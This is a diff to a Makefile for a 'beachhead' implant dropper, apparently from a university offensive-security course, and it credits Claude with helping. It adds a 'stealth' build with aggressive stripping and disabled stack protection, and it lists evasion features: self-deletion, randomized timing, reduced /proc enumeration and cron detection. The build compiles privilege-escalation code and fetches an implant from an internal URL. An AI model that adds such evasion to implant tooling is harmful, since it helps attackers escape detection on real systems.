@@ -1,5 +1,5 @@
 # ==============================================================================
-# COMPSCI564 - Beachhead Makefile
+# COMPSCI564 - Beachhead Makefile (Stealth-Enhanced)
 # ==============================================================================
 # This Makefile compiles the beachhead binary with minimal dependencies
 # 
@@ -8,6 +8,7 @@
 #   make URL='"http://..."'       # Build with custom implant URL
 #   make clean                    # Remove build artifacts
 #   make debug                    # Build with debug symbols and logging
+#   make stealth                  # Build optimized for stealth (recommended)
 #
 # AI Assistance Attribution:
 # Build configuration developed with assistance from Claude (Anthropic)
@@ -18,10 +19,19 @@ URL ?= "http://10.37.1.249/implant"
 
 # Compiler and flags
 CXX = g++
+
+# Standard flags (balanced)
 CXXFLAGS = -O2 -s -Wall -Wextra -DURL='$(URL)'
 
+# Stealth flags (maximum optimization, minimal size)
+STEALTH_FLAGS = -O3 -s -Wall -Wextra -fno-stack-protector \
+                -ffunction-sections -fdata-sections -DURL='$(URL)'
+
+# Debug flags
+DEBUG_FLAGS = -O0 -g -Wall -Wextra -DDEBUG -DURL='$(URL)'
+
 # Linker flags
-LDFLAGS =
+LDFLAGS = -Wl,--gc-sections
 
 # Target binary
 TARGET = beachhead
@@ -36,7 +46,7 @@ OBJS = $(SRCS:.cpp=.o)
 # Build Targets
 # ==============================================================================
 
-# Default target
+# Default target (standard build)
 all: $(TARGET)
 
 # Link object files to create beachhead binary
@@ -44,9 +54,10 @@ $(TARGET): $(OBJS)
 	@echo "[*] Linking $(TARGET)..."
 	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
 	@echo "[*] Stripping debug symbols..."
-	strip $(TARGET)
+	strip --strip-all $(TARGET)
 	@echo "[+] Build complete: $(TARGET)"
 	@ls -lh $(TARGET)
+	@file $(TARGET)
 
 # Compile beachhead.cpp
 beachhead.o: beachhead.cpp privesc_check.h privesc.h
@@ -64,12 +75,28 @@ privesc.o: privesc.cpp privesc.h
 	$(CXX) $(CXXFLAGS) -c privesc.cpp -o privesc.o
 
 # ==============================================================================
-# Debug Build
+# Specialized Builds
 # ==============================================================================
 
-debug: CXXFLAGS = -O0 -g -Wall -Wextra -DDEBUG -DURL='$(URL)'
-debug: clean $(TARGET)
+# Stealth build (maximum optimization, minimal size)
+stealth: CXXFLAGS = $(STEALTH_FLAGS)
+stealth: clean
+	@echo "[*] Building STEALTH version..."
+	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRCS) $(LDFLAGS)
+	@echo "[*] Aggressive stripping..."
+	strip --strip-all --remove-section=.comment --remove-section=.note $(TARGET)
+	@echo "[+] Stealth build complete"
+	@ls -lh $(TARGET)
+	@echo "[*] Binary entropy check:"
+	@sha256sum $(TARGET)
+
+# Debug build (with logging and symbols)
+debug: CXXFLAGS = $(DEBUG_FLAGS)
+debug: clean
+	@echo "[*] Building DEBUG version..."
+	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRCS)
 	@echo "[+] Debug build complete (symbols preserved, logging enabled)"
+	@ls -lh $(TARGET)
 
 # ==============================================================================
 # Utility Targets
@@ -84,25 +111,42 @@ clean:
 # Show build configuration
 info:
 	@echo "===================================================================="
-	@echo "Beachhead Build Configuration"
+	@echo "Beachhead Build Configuration (Stealth-Enhanced)"
 	@echo "===================================================================="
 	@echo "Target:        $(TARGET)"
 	@echo "Compiler:      $(CXX)"
-	@echo "Flags:         $(CXXFLAGS)"
+	@echo "Standard Flags: $(CXXFLAGS)"
+	@echo "Stealth Flags:  $(STEALTH_FLAGS)"
 	@echo "Implant URL:   $(URL)"
 	@echo "Source Files:  $(SRCS)"
 	@echo "===================================================================="
+	@echo "Stealth Features:"
+	@echo "  - No test file creation (stat-based checks)"
+	@echo "  - Minimal /proc enumeration (~300 PIDs vs all)"
+	@echo "  - Randomized timing (60-75s vs fixed 65s)"
+	@echo "  - Multi-strategy cron detection"
+	@echo "  - Self-deletion after execution"
+	@echo "===================================================================="
 
-# Test build (compile but don't strip)
+# Test build (compile but don't strip for debugging)
 test: CXXFLAGS = -O2 -Wall -Wextra -DDEBUG -DURL='$(URL)'
 test: clean
-	@echo "[*] Building test version (with debug output)..."
+	@echo "[*] Building TEST version (with debug output)..."
 	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRCS)
 	@echo "[+] Test build complete"
+	@ls -lh $(TARGET)
+
+# Size comparison
+size-check: all
+	@echo "===================================================================="
+	@echo "Binary Size Analysis"
+	@echo "===================================================================="
+	@size $(TARGET)
+	@echo "===================================================================="
 	@ls -lh $(TARGET)
 
 # ==============================================================================
 # Phony Targets
 # ==============================================================================
 
-.PHONY: all clean debug info test
+.PHONY: all clean debug info test stealth size-check
